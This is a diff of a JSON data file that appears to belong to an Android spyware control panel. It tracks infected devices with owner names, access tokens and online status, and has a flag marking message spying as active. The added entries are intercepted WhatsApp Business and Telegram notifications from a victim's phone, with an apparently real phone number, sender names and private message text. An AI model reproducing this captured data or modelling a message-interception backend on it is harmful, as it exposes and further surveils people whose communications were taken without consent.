@@ -4,7 +4,7 @@
     "deviceName": "HP-ABLO-F55F",
     "ownerUsername": "Zarr",
     "token": "7055f57f74cb7eef5034e3301d747b14",
-    "lastSeen": 1777782654455,
+    "lastSeen": 1777782660581,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T05:33:28.300Z",
@@ -2557,6 +2557,30 @@
     "smsSpyActive": true,
     "smsMessages": [
       {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎8 pesan dari 4 chat",
+        "time": "03/05 11:30",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1777782661084
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 889-9189-1934",
+        "content": "Padahal udh pake yg invisible",
+        "time": "03/05 11:30",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1777782661057
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Damxzk stecu",
+        "content": "Ada",
+        "time": "03/05 11:30",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777782656275
+      },
+      {
         "appName": "Telegram",
         "sender": "Damxzk stecu",
         "content": "Oke",
@@ -3837,7 +3861,7 @@
     "deviceName": "HP-ABIR123-0330",
     "ownerUsername": "Fibersec",
     "token": "ab095dd2405dc78cf8aaa200b596d4bd",
-    "lastSeen": 1777782652087,
+    "lastSeen": 1777782658221,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T20:52:30.047Z",
